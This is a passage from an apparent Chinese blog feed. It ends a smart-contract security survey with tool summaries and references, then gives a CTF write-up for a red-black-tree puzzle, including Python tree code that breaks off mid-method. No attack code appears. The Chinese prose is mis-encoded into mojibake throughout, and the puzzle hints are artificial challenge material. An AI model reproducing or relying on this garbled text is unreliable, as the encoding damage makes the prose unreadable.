id="reffn_contractfuzzer">contractfuzzer</a></sup>è®¾è®¡äº†ä¸€å¥—åŸºäºfuzzçš„æ™ºèƒ½åˆçº¦å®¡è®¡å·¥å…·ContractFuzzerï¼Œä»–ä»¬é€šè¿‡åœ¨EVMä¸­æ’æ¡©ï¼Œä»¥æ­¤è·å–ç¨‹åºåœ¨æ‰§è¡Œä¸­äº§ç”Ÿçš„ä¿¡æ¯ï¼Œé€šè¿‡é¢„å…ˆè®¾ç½®çš„æµ‹è¯•å‡†åˆ™å‘ç°æ¼æ´ï¼Œä»–ä»¬è®¾è®¡çš„å·¥å…·å¯ä»¥æ£€æµ‹<strong>æ— Gaså‘é€ã€Exception Disorderã€é‡å…¥æ¼æ´ã€ä¾èµ–äºæ—¶é—´æˆ³æ¼æ´ã€ä¾èµ–äºåŒºå—é«˜åº¦æ¼æ´ã€å±é™©çš„Delegatecallã€åˆçº¦æ°¸ä¹…é”å®šèµ„é‡‘</strong>7å¤§å®‰å…¨æ€§é—®é¢˜ï¼Œç»è¿‡è¯•éªŒï¼ŒContractFuzzerå‘ç°æ¼æ´çš„å‡†ç¡®ç‡è¾ƒé«˜ï¼Œä½†æ˜¯ç›¸è¾ƒäºOyenteï¼Œæ­¤å·¥å…·æ‰¾åˆ°çš„æ¼æ´æ•°é‡è¾ƒå°‘ã€‚</p></li><li><p>Liuç­‰äºº<sup><a href="#fn_ReGuard" id="reffn_ReGuard">ReGuard</a></sup>æ„å»ºäº†åŸºäºfuzzçš„æ™ºèƒ½åˆçº¦æ£€æµ‹å·¥å…·ï¼Œæ—¨åœ¨æ£€æµ‹åˆçº¦ä¸­çš„<strong>é‡å…¥æ¼æ´</strong>ï¼Œå®éªŒè¡¨æ˜ï¼Œç›¸è¾ƒäºOyenteï¼Œè¯¥å·¥å…·æœ‰æ›´é«˜çš„å‡†ç¡®ç‡ï¼Œå¹¶ä¸”èƒ½å‘ç°æ›´å¤šæ•°é‡çš„é—®é¢˜ã€‚</p></li><li><p>chenç­‰äºº<sup><a href="#fn_DoS" id="reffn_DoS">DoS</a></sup>é€šè¿‡åŠ¨æ€è°ƒæ•´Opæ‰§è¡Œçš„gasèŠ±è´¹é˜»æ­¢DoSæ”»å‡»ï¼ˆé€šè¿‡åå¤æ‰§è¡Œå°gasçš„opcodeï¼Œæ¶ˆè€—ç³»ç»Ÿèµ„æºé€ æˆdosï¼‰ã€‚</p></li></ul><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><blockquote id="fn_DoS"><sup>DoS</sup>. Chen, Ting, et al. â€œAn Adaptive Gas Cost Mechanism for Ethereum to Defend Against Under-Priced DoS Attacks.â€ <em>International Conference on Information Security Practice and Experience</em>. Springer, Cham, 2017.<a href="#reffn_DoS" title="Jump back to footnote [DoS] in the text."> &#8617;</a></blockquote><blockquote id="fn_smarter"><sup>smarter</sup>. Luu, Loi, et al. â€œMaking smart contracts smarter.â€ Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. ACM, 2016.<a href="#reffn_smarter" title="Jump back to footnote [smarter] in the text."> &#8617;</a></blockquote><blockquote id="fn_blackhat2018"><sup>blackhat2018</sup>. Bai, Zhenxuan, et al. â€œYour May Have Paid More than You Imagineï¼šReplay Attacks on Ethereum Smart Contracts.â€ Blackhat. 2018<a href="#reffn_blackhat2018" title="Jump back to footnote [blackhat2018] in the text."> &#8617;</a></blockquote><blockquote id="fn_seebug1"><sup>seebug1</sup>. ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸Šï¼‰, <a href="https://paper.seebug.org/601/" target="_blank" rel="noopener">https://paper.seebug.org/601/</a><a href="#reffn_seebug1" title="Jump back to footnote [seebug1] in the text."> &#8617;</a></blockquote><blockquote id="fn_contractfuzzer"><sup>contractfuzzer</sup>. Bo Jiang, Ye Liu, and W.K. Chan. 2018. ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection. In Proceedings ofthe 33rd IEEE/ACM International Conference on Automated Software Engineering (ASEâ€™18), September 3â€“7, Montpellier, France, 10 pages.<a href="#reffn_contractfuzzer" title="Jump back to footnote [contractfuzzer] in the text."> &#8617;</a></blockquote><blockquote id="fn_varreplace"><sup>varreplace</sup>. Solidityä¸­å­˜å‚¨æ–¹å¼é”™è¯¯ä½¿ç”¨æ‰€å¯¼è‡´çš„å˜é‡è¦†ç›–ï¼Œ<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/blockchain-articles/175237.html</a><a href="#reffn_varreplace" title="Jump back to footnote [varreplace] in the text."> &#8617;</a></blockquote><blockquote id="fn_maian"><sup>maian</sup>. Ivica Nikolic, Aashish Kolluri, Ilya Sergey, Prateek Saxena, and Aquinas Hobor. 2018. Finding The Greedy, Prodigal, and Suicidal Contracts at Scale. (2018). DOI:<a href="https://doi.org/arXiv:1802.06038v1" target="_blank" rel="noopener">https://doi.org/arXiv:1802.06038v1</a><a href="#reffn_maian" title="Jump back to footnote [maian] in the text."> &#8617;</a></blockquote><blockquote id="fn_ReGuard"><sup>ReGuard</sup>. Liu, C., Liu, H., Cao, Z., Chen, Z., Chen, B., &amp; Roscoe, B. (2018). ReGuard: Finding reentrancy bugs in smart contracts. Proceedings - International Conference on Software Engineering, 65â€“68. <a href="https://doi.org/10.1145/3183440.3183495" target="_blank" rel="noopener">https://doi.org/10.1145/3183440.3183495</a><a href="#reffn_ReGuard" title="Jump back to footnote [ReGuard] in the text."> &#8617;</a></blockquote><blockquote id="fn_dasp"><sup>dasp</sup>. <a href="http://www.dasp.co/" target="_blank" rel="noopener">http://www.dasp.co/</a><a href="#reffn_dasp" title="Jump back to footnote [dasp] in the text."> &#8617;</a></blockquote>]]></content>
      
      
      <categories>
          
          <category> åŒºå—é“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç å®‰å…¨ </tag>
            
            <tag> åŒºå—é“¾ </tag>
            
            <tag> æ™ºèƒ½åˆçº¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018ç½‘é¼æ¯äºŒå‰æ ‘&amp;martricks wp</title>
      <link href="/ctf-2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E4%BA%8C%E5%8F%89%E6%A0%91-martrickswp/"/>
      <url>/ctf-2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E4%BA%8C%E5%8F%89%E6%A0%91-martrickswp/</url>
      
        <content type="html"><![CDATA[<p>2018å¹´ç½‘é¼æ¯ï¼Œemmmï¼Œå¥½ä¸å®¹æ˜“çœ‹åˆ°ä¸ªç®—æ³•é¢˜è¿˜èŠ±äº†å¾ˆé•¿æ—¶é—´ï¼Œå¤ªéš¾è¿‡äº†T_T</p><h1 id="äºŒå‰æ ‘"><a href="#äºŒå‰æ ‘" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>ä¸‹è½½é¢˜ç›®åï¼Œå¾—åˆ°ä¸€å¼ çº¢é»‘æ ‘çš„å›¾ç‰‡å’ŒREADME.txt. å°†readmeè¿›è¡Œbase64è§£ç å¯ä»¥å¾—åˆ°hitï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.è¿™æ˜¯ä¸€æ£µçº¢é»‘æ ‘</span><br><span class="line">2.æ ‘ä»1-59ä¸Šçš„æœå­ä¾æ¬¡ä¸º ek`~3c:gf017b744/b38fd~abm7g5489e2&#123;lf6z8d16hae`98&#125;b|-21m.e:</span><br><span class="line">3.ä¾æ¬¡ä»æ ‘ä¸Šå–èµ°ç¬¬ 18,35,53,50,14,28,19,6,54,36 ä¸ªæœå­,è¿‡ç¨‹ä¸­ä¿æŒçº¢é»‘æ ‘æ€§è´¨ä¸å˜</span><br><span class="line">4.tmpflagä¸ºç¬¬ 8,56,47,37,52,34,17,8,8,29,7,47,40,57,46,24,34,34,57,29,22,5,16,57,24,29,8,12,57,12,12,21,33,34,55,51,22,45,34,31,1,23 ä¸ªæœå­</span><br><span class="line">5.flagä¸º tmpflag çº¢è‰²æœå­ ASCII +1 , é»‘è‰²æœå­ ASCII-1</span><br><span class="line">6.è®©æˆ‘ä»¬æ„‰å¿«çš„å¼€å§‹è·å–flagå§</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>ç»è¿‡æç¤ºï¼Œé¦–å…ˆéœ€è¦æ‰¾ä¸€ä»½çº¢é»‘æ ‘çš„å®ç°ï¼Œå¹¶ä¸”æŒ‰ç…§å›¾ç‰‡æ„é€ ä¸€é¢—çº¢é»‘æ ‘(å¦‚æœä¸æŒ‰å›¾ç‰‡ä¼šå‡ºç°å¤šè§£æƒ…å†µï¼Œå› ä¸ºè¿™ç‚¹è¢«å‘æƒ¨)ï¼Œä»¥ä¸‹ç»™å‡ºä¸€ä¸ªå¾ˆå¥½çš„pythonç‰ˆçº¢é»‘æ ‘å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">BLACK = <span class="number">0</span></span><br><span class="line">RED = <span class="number">1</span></span><br><span class="line"><span class="comment">#graphic elements of rbtree for printing</span></span><br><span class="line">VC = <span class="string">'â”‚'</span></span><br><span class="line">HC = <span class="string">'â”€'</span></span><br><span class="line">SIZE = <span class="number">3</span></span><br><span class="line">RIG = <span class="string">'â”Œ'</span> + HC * SIZE</span><br><span class="line">LEF = <span class="string">'â””'</span> + HC * SIZE</span><br><span class="line">SP = chr(<span class="number">32</span>)</span><br><span class="line">IND1 = SP * (SIZE + <span class="number">1</span>)</span><br><span class="line">IND2 = VC + SP * SIZE</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rbnode</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key=None, value=None, color=BLACK,left=None,right=None,p=None)</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.value = value</span><br><span class="line">        self.color = color</span><br><span class="line">        self.left = left</span><br><span class="line">        self.right = right</span><br><span class="line">        self.p = p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'%s%s%s'</span> % (self.key,<span class="string">'â—†'</span> <span class="keyword">if</span> self.color <span class="keyword">is</span> BLACK <span class="keyword">else</span> <span class="string">'â—‡'</span>,self.value )</span><br><span class="line"></span><br><span class="line">_NONE=rbnode()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rbtree</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data=False,default_value=<span class="number">0</span>, nodes=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> nodes:</span><br><span class="line">            self.root = nodes[<span class="number">28</span>]</span><br><span class="line">            self.default_value = default_value <span class="comment">#for method: force_search</span></span><br><span class="line">            self.nil = _NONE</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.nil = _NONE</span><br><span class="line">            self.root = self.nil</span><br><span class="line">            self.default_value = default_value <span class="comment">#for method: force_search</span></span><br><span class="line">            <span class="keyword">if</span> hasattr(data, <span class="string">'__iter__'</span>):</span><br><span class="line">                <span class="keyword">for</span> key, value <span class="keyword">in</span> data:</span><br><span class="line">                    self.insert(rbnode(key,value))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\n'</span>.join(self.graph())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">graph</span><span class="params">(self, x=False, prefix=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="string">"beautifully print rbtree, big key node first"</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            p = x.p</span><br><span class="line">            last_prefix = <span class="string">''</span></span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">                pp = p.p</span><br><span class="line">                last_prefix = LEF <span class="keyword">if</span> p.left <span class="keyword">is</span> x <span class="keyword">else</span> RIG</span><br><span class="line">                <span class="keyword">if</span> pp <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">                    <span class="keyword">if</span> (pp.left <span class="keyword">is</span> p) <span class="keyword">is</span> (p.left <span class="keyword">is</span> x):</span><br><span class="line">                        prefix = prefix + IND1</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        prefix = prefix + IND2</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.graph(x.right, prefix)</span><br><span class="line">            <span class="keyword">yield</span> <span class="string">'%s%s%s'</span> % (prefix, last_prefix, x)</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.graph(x.left, prefix)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, key, x=False)</span>:</span></span><br><span class="line">        <span class="string">"find node according to key, return self.nil if not found"</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> (x <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (key != x.key):</span><br><span class="line">            <span class="keyword">if</span> key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        <span class="string">"insert z node with key and value"</span></span><br><span class="line">        y = self.nil</span><br><span class="line">        x = self.root</span><br><span class="line">        <span class="keyword">while</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> z.key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        z.p = y</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = z</span><br><span class="line">        <span class="keyword">elif</span> z.key &lt; y.key:</span><br><span class="line">            y.left = z</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y.right = z</span><br><span class="line">        z.left = self.nil</span><br><span class="line">        z.right = self.nil</span><br><span class="line">        z.color = RED</span><br><span class="line">        self.insert_fixup(z)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self, z)</span>:</span></span><br><span class="line">        y = z</span><br><span class="line">        y_original_color = y.color</span><br><span class="line">        <span class="keyword">if</span> z.left <span class="keyword">is</span> self.nil:</span><br><span class="line">            x = z.right</span><br><span class="line">            self.transplant(z, x)</span><br><span class="line">        <span class="keyword">elif</span> z.right <span class="keyword">is</span> self.nil:</span><br><span class="line">            x = z.left</span><br><span class="line">            self.transplant(z, x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = self.minimum(z.right)</span><br><span class="line">            y_original_color = y.color</span><br><span class="line">            x = y.right</span><br><span class="line">            <span class="keyword">if</span> y.p <span class="keyword">is</span> z:</span><br><span class="line">                x.p = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.transplant(y, x)</span><br><span class="line">                y.right = z.right</span><br><span class="line">                y.right.p = y</span><br><span class="line">            self.transplant(z, y)</span><br><span class="line">            y.left = z.left</span><br><span class="line">            y.left.p = y</span><br><span class="line">            y.color = z.color</span><br><span class="line">        <span class="keyword">if</span> y_original_color <span class="keyword">is</span> BLACK:</span><br><span class="line">            self.delete_fixup(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.root <span class="keyword">is</span> self.nil</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">right_walk</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.right_walk(x.right)</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.right_walk(x.left)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">left_walk</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.left_walk(x.left)</span><br><span class="line">            <span class="keyword">yield</span> x</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> self.left_walk(x.right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">force_search</span><span class="params">(self,key)</span>:</span></span><br><span class="line">        y = self.nil</span><br><span class="line">        x = self.root</span><br><span class="line">        <span class="keyword">while</span> x <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">if</span> key == x.key:</span><br><span class="line">                <span class="keyword">return</span> x</span><br><span class="line">            y = x</span><br><span class="line">            <span class="keyword">if</span> key &lt; x.key:</span><br><span class="line">                x = x.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x = x.right</span><br><span class="line">        z = rbnode()</span><br><span class="line">        original_z = z</span><br><span class="line">        z.key = key</span><br><span class="line">        z.value = self.default_value</span><br><span class="line">        z.p = y</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = z</span><br><span class="line">        <span class="keyword">elif</span> z.key &lt; y.key:</span><br><span class="line">            y.left = z</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y.right = z</span><br><span class="line">        z.left = self.nil</span><br><span class="line">        z.right = self.nil</span><br><span class="line">        z.color = RED</span><br><span class="line">        self.insert_fixup(z)</span><br><span class="line">        <span class="keyword">return</span> original_z</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maximum</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> x.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            x = x.right</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">minimum</span><span class="params">(self, x=False)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            x = self.root</span><br><span class="line">        <span class="keyword">while</span> x.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            x = x.left</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">successor</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"return node with smallest key greater than x.key"</span></span><br><span class="line">        <span class="keyword">if</span> x.right <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">return</span> self.minimum(x.right)</span><br><span class="line">        y = x.p</span><br><span class="line">        <span class="keyword">while</span> (y <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (x <span class="keyword">is</span> y.right):</span><br><span class="line">            x = y</span><br><span class="line">            y = y.p</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predecessor</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="string">"return node with biggest key lower than x.key"</span></span><br><span class="line">        <span class="keyword">if</span> x.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            <span class="keyword">return</span> self.maximum(x.left)</span><br><span class="line">        y = x.p</span><br><span class="line">        <span class="keyword">while</span> (y <span class="keyword">is</span> <span class="keyword">not</span> self.nil) <span class="keyword">and</span> (x <span class="keyword">is</span> y.left):</span><br><span class="line">            x = y</span><br><span class="line">            y = y.p</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">left_rotate</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        y = x.right</span><br><span class="line">        x.right = y.left</span><br><span class="line">        <span class="keyword">if</span> y.left <span class="keyword">is</span> <span class="keyword">not</span> self.nil:</span><br><span class="line">            y.left.p = x</span><br><span class="line">        y.p = x.p</span><br><span class="line">        <span class="keyword">if</span> x.p <span class="keyword">is</span> self.nil:</span><br><span class="line">            self.root = y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> x.p.left:</span><br><span class="line">                x.p.left = y</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x.p.right = y</span><br><span class="line">        y.left = x</span><br><span class="line">        x.p = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">right_rotate</span><span class="params">(self, x)</span>:</span></span><br><span 